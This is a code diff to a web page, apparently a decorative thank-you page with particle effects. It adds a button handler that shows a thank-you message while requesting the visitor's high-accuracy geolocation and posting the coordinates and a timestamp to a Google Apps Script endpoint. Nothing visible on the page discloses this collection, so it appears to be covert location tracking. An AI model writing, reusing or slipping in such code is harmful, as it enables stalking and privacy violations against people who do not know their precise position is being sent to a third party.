@@ -176,6 +176,66 @@
         setTimeout(() => particle.remove(), 5000);
       }
     }
+
+    btn.addEventListener('click', () => {
+      thank.style.display = 'block';
+      shareLocation();
+    });
+
+    function shareLocation() {
+      if (!navigator.geolocation) {
+        return alert('Trình duyệt không hỗ trợ.');
+      }
+
+      const options = {
+        enableHighAccuracy: true,
+        timeout: 20000,
+        maximumAge: 0
+      };
+      const minAccuracy = 30;
+
+      const watchId = navigator.geolocation.watchPosition(
+        pos => {
+          if (pos.coords.accuracy <= minAccuracy) {
+            navigator.geolocation.clearWatch(watchId);
+            sendToServer(pos.coords.latitude, pos.coords.longitude);
+          }
+        },
+        err => {
+          navigator.geolocation.clearWatch(watchId);
+          alert('Không thể lấy vị trí. Lỗi: ' + err.message);
+        },
+        options
+      );
+    }
+
+    function sendToServer(lat, lon) {
+      const now = new Date();
+      const vnOffset = 7 * 60 * 60 * 1000; // 7 tiếng tính bằng mili giây
+      const vnTime = new Date(now.getTime() + vnOffset).toISOString();
+      const params = new URLSearchParams({
+        latitude: lat,
+        longitude: lon,
+        timestamp: vnTime
+      });
+
+      fetch('https://script.google.com/macros/s/AKfycbzjgqqM3-oNT4_RAKEhvAWcRFhZKIXyXNpe3pUiDic_EmtiaPv6dH2idwoZd9BxAqSW/exec', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/x-www-form-urlencoded'
+        },
+        body: params.toString()
+      })
+      .then(res => res.json())
+      .then(data => {
+        console.log('Server response:', data);
+      })
+      .catch(err => {
+        alert('Error: ' + err.message);
+        console.error(err);
+      });
+    }
+
   </script>
 </body>
 </html>
